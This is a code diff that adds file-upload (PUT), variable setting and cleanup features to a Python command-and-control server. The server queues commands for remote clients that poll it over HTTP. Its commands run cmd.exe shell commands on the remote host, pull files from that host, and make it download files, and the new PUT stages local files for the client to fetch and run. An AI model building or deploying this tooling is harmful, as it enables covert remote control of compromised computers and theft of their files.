@@ -13,12 +13,13 @@
 #
 
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
-from urlparse import parse_qs
 import cgi
 import os
 import sys
 from Queue import Queue
 from threading import Thread
+from shutil import copyfile, rmtree
+import ntpath
 
 PORT_NUMBER = 8080
 
@@ -27,10 +28,25 @@ class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # File download
         if self.path.startswith('/f/'):
-            self.send_response(200)
-            self.send_header('content-type', 'text/plain')
-            self.end_headers()
-            self.wfile.write('xxx')
+            # Compile path
+            filename = ntpath.basename(self.path)
+            filepath = './upload/%s' % filename
+
+            # 404 if no valid file
+            if not os.path.exists(filepath):
+                self.send_error(404)
+                return
+
+            # Return file
+            with open(filepath, 'rb') as f:
+                self.send_response(200)
+                self.send_header('content-type', 'application/octet-stream')
+                self.end_headers()
+                self.wfile.write(f.read())
+
+            # Remove file from disk
+            os.remove(filepath)
+
             return
 
         if commands.empty():
@@ -48,6 +64,7 @@ class myHandler(BaseHTTPRequestHandler):
     # Result from executing command
     def do_POST(self):
         global context
+
         contenttype_header = self.headers.getheader('content-type')
         if contenttype_header:
             ctype, pdict = cgi.parse_header(contenttype_header)
@@ -61,6 +78,7 @@ class myHandler(BaseHTTPRequestHandler):
         result_filename = form['result'].filename
         result_data = form['result'].file.read()
 
+        # Show '> ' command input string after command output
         if context:
             cmd_data = cmd_data.replace(context + ' ', '')
         print cmd_data
@@ -105,6 +123,7 @@ def run_httpserver():
 commands = Queue()
 server = None
 context = ''
+variables = {}
 
 def main():
     # Start HTTP server thread
@@ -113,7 +132,7 @@ def main():
     httpserver.start()
 
     # Loop to add new commands
-    global context
+    global context, variables
     s = ''
     while True:
         s = raw_input('%s> ' % context)
@@ -146,27 +165,78 @@ def main():
             # 1) Full command is entered, i.e.: SHELL dir C:\
             if len(splitcmd) > 1:
                 args = splitcmd[1]
+
+                # PUT
+                if cmd == 'PUT':
+                    args = args.strip("\"")
+
+                    # Check file existence
+                    if not os.path.exists(args):
+                        print 'File not found: %s' % args
+                        continue
+
+                    # Check if LHOST variable is set
+                    if 'LHOST' not in variables:
+                        print 'Variable LHOST not set'
+                        continue
+
+                    lhost = variables['LHOST']
+
+                    # Create folder if required
+                    if not os.path.exists('upload'):
+                        os.mkdir('upload')
+
+                    # Copy file
+                    filename = ntpath.basename(args)
+                    copyfile(args, './upload/%s' % filename)
+
+                    # Update command and args
+                    cmd = 'WGET'
+                    args = 'http://%s:%d/f/%s' % (lhost, PORT_NUMBER, filename)
+
+                # SET
+                elif cmd == 'SET':
+                    (variable, value) = args.split(' ')
+                    variables[variable.upper()] = value
+                    continue
+
+                # UNSET
+                elif cmd == 'UNSET':
+                    if args.upper() in variables:
+                        del variables[args.upper()]
+                    continue
+
             # 2) Only context change, i.e.: SHELL
             elif cmd == 'SHELL':
                 context = 'SHELL'
+                continue
+            elif cmd == 'SET':
+                print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
                 continue
             elif cmd == 'KILL' or cmd == 'SLEEP':
                 dummy = 'x'
             elif cmd == 'SHUTDOWN':
                 server.shutdown()
+                if os.path.exists('./upload'):
+                    rmtree('./upload')
                 print 'Shutting down %s' % os.path.basename(__file__)
                 exit(0)
             elif cmd == 'HELP':
                 print 'Supported commands:\n' \
-                      '- SLEEP [ms]      - Set client polling interval;\n' \
-                      '                    When entered without ms, shows the current interval.\n' \
-                      '- SHELL [command] - Execute command in cmd.exe interpreter;\n' \
-                      '                    When entered without command, switches to SHELL context.\n' \
-                      '- GET [path]      - Download the file at [path] to the .\\downloads folder.\n' \
-                      '- WGET [url]      - Download file from url.\n' \
-                      '- KILL            - Stop client script.\n' \
-                      '- SHUTDOWN        - Exit this commandline interface (does not shutdown the client).\n' \
-                      '- HELP            - Show this help.\n'
+                      '- SLEEP [ms]         - Set client polling interval;\n' \
+                      '                       When entered without ms, shows the current interval.\n' \
+                      '- SHELL [command]    - Execute command in cmd.exe interpreter;\n' \
+                      '                       When entered without command, switches to SHELL context.\n' \
+                      '- GET [path]         - Download the file at [path] to the .\\downloads folder.\n' \
+                      '- PUT [localpath]    - Upload the file at [path] to the remote host.\n' \
+                      '                       Note: Variable LHOST is required.\n' \
+                      '- WGET [url]         - Download file from url.\n' \
+                      '- KILL               - Stop script on the remote host.\n' \
+                      '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.\n' \
+                      '                       When entered without parameters, it shows the currently set variables.\n' \
+                      '- UNSET [name]       - Unset a variable\n' \
+                      '- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).\n' \
+                      '- HELP               - Show this help.\n'
                 continue
             else:
                 print '%s> Unknown command: %s' % (context, s)
